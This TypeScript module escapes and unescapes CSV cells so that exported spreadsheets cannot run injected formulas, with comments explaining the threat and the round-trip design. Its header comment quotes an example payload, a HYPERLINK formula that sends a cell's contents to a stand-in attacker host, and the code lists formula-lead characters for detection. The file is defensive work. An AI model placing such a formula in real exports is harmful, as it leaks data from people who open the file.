/**
 * CSV injection — our problem, on the EXPORT side.
 *
 * A cell whose first character is `=`, `+`, `-`, `@`, tab or CR is interpreted
 * as a formula by Excel, LibreOffice and Google Sheets. So a user who sets their
 * problem title to
 *
 *     =HYPERLINK("https://evil.example/?"&A1,"Click")
 *
 * has not attacked us. They have attacked whoever opens the CSV **we generate**
 * — which is the user themselves, or anyone they share their export with. The
 * importer is not the surface; the exporter is, because the export is a
 * deliverable we hand someone to open in a spreadsheet.
 *
 * ## The mitigation, and its cost
 *
 * Prefix a single quote. Excel reads `'=x` as the literal text `=x` and does not
 * evaluate it.
 *
 * That mutates the data, which would break the round-trip acceptance criterion
 * ("export → import produces zero new rows") if only half of it existed. So the
 * two functions here are a pair and must stay symmetric: `escape` on the way
 * out, `unescape` on the way in. `unescapeCell(escapeCell(x)) === x` is asserted
 * as a property over generated inputs, not just over the examples.
 *
 * ## What this deliberately does NOT do
 *
 * It does not strip or reject the content. A title beginning with `-` is
 * legitimate ("-1 is not a valid index"), and refusing it would be us breaking
 * the user's data to solve a spreadsheet's problem. Neutralise on output,
 * restore on input, store verbatim.
 */

/**
 * Leading characters a spreadsheet treats as the start of a formula.
 *
 * Tab and CR are in the list because a leading whitespace character is stripped
 * by some spreadsheet parsers before the formula check, so `\t=cmd` reaches the
 * evaluator as `=cmd`. This is the same shape of bug as the URL parser stripping
 * control characters out of a scheme — the check must happen on what the
 * CONSUMER will see, not on what we think we wrote.
 */
const FORMULA_LEAD = ['=', '+', '-', '@', '\t', '\r'] as const;

/** The marker prefixed to a dangerous cell. */
const TEXT_MARKER = "'";

function isFormulaLead(char: string | undefined): boolean {
  return char !== undefined && (FORMULA_LEAD as readonly string[]).includes(char);
}

/**
 * Would this value be escaped?
 *
 * Escapes the escape, which is the part the first version got wrong. A value
 * that ALREADY looks like an escaped one — `'=x` — has to be escaped too, or
 * `unescape` cannot tell a marker we added from an apostrophe the user typed.
 *
 * Iterative rather than recursive: titles are capped at 200 characters, so the
 * depth is bounded either way, but a string of apostrophes is exactly the input
 * someone would fuzz with.
 */
function needsEscaping(value: string): boolean {
  let index = 0;
  while (index < value.length && value[index] === TEXT_MARKER) index += 1;
  return isFormulaLead(value[index]);
}

/**
 * Neutralise a cell for a spreadsheet, reversibly.
 *
 * Applied to every exported cell, not only the ones that look suspicious —
 * deciding per-field which columns "could" contain a formula is how one gets
 * missed when a column is added later.
 */
export function escapeCell(value: string): string {
  return needsEscaping(value) ? `${TEXT_MARKER}${value}` : value;
}

/**
 * Undo `escapeCell`. An exact inverse, for every input.
 *
 * The first version was NOT an inverse, and the gap only shows on the second
 * lap. It stripped a marker whenever the next character was a formula lead, so
 * a title the user genuinely typed as `'=x` came back as `=x` — a silent data
 * change on export → import, which then stabilised and looked fine forever
 * after. Testing `unescape(escape(x)) === x` on fresh values could not catch
 * it, because the damaged value only appears once a cycle has run.
 *
 * With the escape-the-escape rule, the marker is stripped only when what
 * follows would itself have been escaped, so `''=x → '=x → =x` unwinds one
 * layer per lap and never one too many. A title beginning with an ordinary
 * apostrophe — `'tis` — is untouched, since `t` is not a formula lead.
 */
export function unescapeCell(value: string): string {
  if (value[0] !== TEXT_MARKER) return value;
  return needsEscaping(value.slice(1)) ? value.slice(1) : value;
}

/** True when a spreadsheet would evaluate this cell as a formula. */
export function wouldExecuteInSpreadsheet(value: string): boolean {
  return isFormulaLead(value[0]);
}
